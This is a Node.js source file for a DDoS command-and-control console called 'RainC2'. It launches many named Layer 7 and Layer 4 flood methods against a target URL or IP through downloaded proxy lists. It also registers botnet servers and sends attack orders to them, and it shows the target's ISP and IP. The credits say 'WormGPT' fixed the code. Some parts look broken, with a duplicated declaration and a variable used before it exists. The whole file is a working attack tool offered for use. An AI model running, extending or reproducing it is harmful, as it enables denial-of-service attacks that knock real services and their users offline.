const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const chalk = require('chalk');
const gradient = require('gradient-string');
const fs = require('fs')
const dns = require('dns');
const { promisify } = require('util');
const table = require('cli-table3');
const fetch = require('node-fetch');
const whois = require('whois-json');
const axios = require('axios')
const path = require('path')
const version = '1.0.0'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
\x1b[36m             RainC2
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`Despencies Is Installed 100%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/wicaktzy/PSTeamDb/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`Checking Version.. This Version Is ${version} `);
    if (version === latestVersion.trim()) {
    console.log(`Your Acces Is Allowed,Verification Is Valid`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/wicaktzy/cache/refs/heads/main/sigma.txt');
    const password = await secretBangetJir.text();
    await console.log(`Input PassKey`)
    permen.question('[\x1b[1m\x1b[31mSecurityPhase\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Login`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To RainC2 Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "help" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`Fetching Data ${version} => ${latestVersion.trim()}`)
      console.log(`Fetching Data Failed`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Error ExitCode 0`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}

// [========================================] //
async function getIPFromURL(host) {
  return new Promise((resolve, reject) => {
    const hostname = new URL(host).hostname;
    dns.lookup(hostname, (err, address) => {
      if (err) {
        reject(`Error fetching IP for ${host}: ${err.message}`);
      } else {
        resolve(address);
      }
    });
  });
}

async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
    if (args.length < 3) {
        console.log(`Example usage: <methods> <url> <duration>`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;

    if (parseInt(duration) > 300) {
        console.log(chalk.red("Error: Duration cannot exceed 300 seconds!"));
        sigma();
        return;
    }

    try {
        let hostname;
        if (target.startsWith('http')) {
            const parsing = new URL(target);
            hostname = parsing.hostname;
        } else {
            hostname = target;
        }

        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        console.clear();
        console.log(`
⣀⣀⣀⣠⣤⣤⣤⠤⡀        
⣠⣤⣤⣤⡤\x1b[91m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
⢨⣭⣭⡅\x1b[91m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
⣄⢻⣿⣧\x1b[91m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${target}\x1b[0m ]
⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Duration : [ \x1b[34m${duration}\x1b[0m ]
 ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Methods  : [ \x1b[34m${methods}\x1b[0m ]
\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀⠀⠀⠀  
  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${result.as}\x1b[0m ]
\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${result.query}\x1b[0m ]
 \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${result.isp}\x1b[0m ]
⠀⠀  
                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
        `);
    } catch (error) {
        console.log(`Oops Something Went wrong`);
    }

    const metode = path.join(__dirname, `/lib/cache/${methods}`);

if (methods === 'glory') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'flood') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'storm') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'thunder') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'bypass') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'maklo') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'https') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'h2-raw') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'cibi') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'h2') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'tls') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    sigma();
} else if (methods === 'thspeed') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
    sigma(); 
} else if (methods === 'cf') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
    sigma(); 
} else if (methods === 'fire') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
    sigma(); 
} else if (methods === 'httpx') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
    sigma(); 
} else if (methods === 'ninja') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
    sigma(); 
} else if (methods === 'pidoras') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'xyn') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'uam') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'h2-meris') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} GET ${target} ${duration} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`);
    sigma();
} else if (methods === 'blast') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'raw') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'h2-flood') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'browser') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else if (methods === 'quantum') {
    pushMonitor(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
} else {
    console.log(`Method ${methods} not recognized for Layer 7`);
}
}

//====================== LAYER 4 CONTROLLER ==================
async function handleAttackL4(args) {
  if (args.length < 4) {
    console.log(`Example: attackl4 <ip> <port> <duration> <method>`);
    sigma();
    return;
  }

  const [targetL4, port, durationL4, methodsL4] = args;

  if (parseInt(durationL4) > 300) {
    console.log(chalk.red("Error: Duration cannot exceed 300 seconds!"));
    sigma();
    return;
  }

  try {
    let hostnameL4;
    if (targetL4.startsWith('http')) {
      const parsing = new URL(targetL4);
      hostnameL4 = parsing.hostname;
    } else {
      hostnameL4 = targetL4;
    }

    const scrapeL4 = await axios.get(`http://ip-api.com/json/${hostnameL4}?fields=isp,query,as`);
    const resultL4 = scrapeL4.data;

    console.clear();
    console.log(`
⣀⣀⣀⣠⣤⣤⣤⠤⡀        
⣠⣤⣤⣤⡤\x1b[91m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
⢨⣭⣭⡅\x1b[91m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
⣄⢻⣿⣧\x1b[91m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${targetL4}\x1b[0m ]
⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Port     : [ \x1b[34m${port}\x1b[0m ]
 ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Duration : [ \x1b[34m${durationL4}\x1b[0m ]
\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀Methods  : [ \x1b[34m${methodsL4}\x1b[0m ]
  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${resultL4.as}\x1b[0m ]
\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${resultL4.query}\x1b[0m ]
 \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${resultL4.isp}\x1b[0m ]
⠀⠀  
                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
`);
  } catch (error) {
    console.log(`Oops Something Went wrong`);
  }

  const metodeL4 = path.join(__dirname, `/lib/cache/${methodsL4}`);

  //====================== LAYER 4 METHODS ====================
  if (methodsL4 === 'udp') {
    pushMonitor(targetL4, methodsL4, durationL4);
    exec(`node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
    sigma();
  } else if (methodsL4 === 'tcp') {
    pushMonitor(targetL4, methodsL4, durationL4);
    exec(`node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
    sigma();
  } else {
    console.log(`Method ${methodsL4} not recognized for Layer 4`);
  }
}
// [========================================] //
async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: attackbotnet <target> <duration> <methods>\nattackbotnet https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    let result;

    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });

        console.clear();
        console.log(`
⣀⣀⣀⣠⣤⣤⣤⠤⡀        
⣠⣤⣤⣤⡤\x1b[35m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
⢨⣭⣭⡅\x1b[34m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
⣄⢻⣿⣧\x1b[36m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${target}\x1b[0m ]
⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Duration : [ \x1b[34m${duration}\x1b[0m ]
 ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Methods  : [ \x1b[34m${methods}\x1b[0m ]
\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀⠀⠀⠀  
  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${result.as}\x1b[0m ]
\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${result.query}\x1b[0m ]
 \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${result.isp}\x1b[0m ]
  \x1b[91m ⠘\x1b[0m                  ⠀BOTNET      : [ \x1b[34m${successCount}\x1b[0m ]
⠀⠀  
                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
Please After Attack Type [\x1b[1m\x1b[35mcls\x1b[0m] To Return To The Home
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    const [target, duration, methods] = args;
let botnetData;
let successCount = 0;
const timeout = 20000;
    
    
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
    
    
}


async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created By Gwyn/Stevee
Thanks to WormGPT for fixing this code
`

permen.question(
  chalk.bgWhite.red('RainC2') + chalk.reset(' > '),
  (input) => {
    const [command, ...args] = input.trim().split(/\s+/);


if (command === 'help') {
    console.log(`
NAME       │ ALIAS            │ DESCRIPTION
───────────┼──────────────────┼─────────────────────────────────
methods    │ ---              │ Show methods L7/4
monitor    │ ---              │ Show ongoing attack monitor
credits    │ ---              │ Show creator of these tools
cls        │ ---              │ Clear terminal screen
botnet     | ---              | Botnet Attack
addsrv     | ---              | Add Server To Botnet
testsrv    | ---              | Checking Your Botnet's Srv
botnet-mt  | ---              | Botnet Methods

                  
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`

NAME       │ DESCRIPTION                                 │ DURATION
───────────┼─────────────────────────────────────────────┼────────────
glory      │ Layer 7 - Attack URL 
flood      │ Layer 7 - Attack URL
storm      │ Layer 7 - Attack URL 
ninja      │ Layer 7 - Attack URL
thunder    │ Layer 7 - Attack URL
https      │ Layer 7 - Attack URL
httpx      │ Layer 7 - Attack URL
bypass     │ Layer 7 - Attack URL 
h2         │ Layer 7 - Attack URL 
cf         │ Layer 7 - Attack URL 
xyn        │ Layer 7 - Attack URL 
blast      │ Layer 7 - Attack URL 
uam        │ Layer 7 - Attack URL 
maklo      | Layer 7 - Attack URL
raw        │ Layer 7 - Attack URL 
quantum    │ Layer 7 - Attack URL
h2-meris   │ Layer 7 - Attack URL
h2-raw     | Layer 7 - Attack URL
cibi       | Layer 7 - Attack URL
fire       | Layer 7 - Attack URL
browser    │ Layer 7 - Attack URL
tls        │ Layer 7 - Attack URL
pidoras    │ Layer 7 - Attack URL
thspeed    │ Layer 7 - Attack URL
udp        │ Layer 4 - Attack Ip port
tcp        │ Layer 4 - Attack Ip port

               \x1b[36m𝐕𝐨𝐫𝐭𝐞𝐗𝐄𝐱𝐞𝐂𝐮𝐭𝐢𝐨𝐧𝐕𝐚𝐮𝐥𝐭\x1b[0m              
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (['tls', 'glory', 'flood', 'pidoras', 'thunder', 'bypass', 'strom', 'thspeed', 'h2', 'xyn', 'uam', 'blast', 'raw', 'quantum', 'browser','h2-raw','cibi','maklo','fire','cf','ninja','h2-meris'].includes(command)) {
    handleAttackCommand([args[0], args[1], command]);
} else if (['tcp', 'udp'].includes(command)) {
  if (args.length < 3) {
    console.log(`Example usage: <methods> <ip> <port> <duration>`);
    sigma();
    return;
  }

  const target = args[0];
  const port = args[1];
  const duration = args[2]; 
  handleAttackL4([target, port, duration, command]); 
  } else if (command === 'monitor') {
  monitorOngoingAttacks();
    sigma();
  } else if (command === 'clear') {
    banner()
    sigma()
  } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
    sigma()
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
    sigma()
  } else if (command === 'botnet') {
    AttackBotnetEndpoints(args)
    sigma()
  } else if (command === 'botnet-mt') {
    console.log(`
──────────────────────────────
► VIP
     - raw      │  - strike
     - httpx    │  - storm
     - tls      │  - bypass
     - browser  |  - fire
     - nuke     │  - h2-meris
     - java     │  - h2
     - glory    |  - h2-raw
     - flood    │  - ninja
     - storm    │  - cibi
──────────────────────────────
`);
    sigma();
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
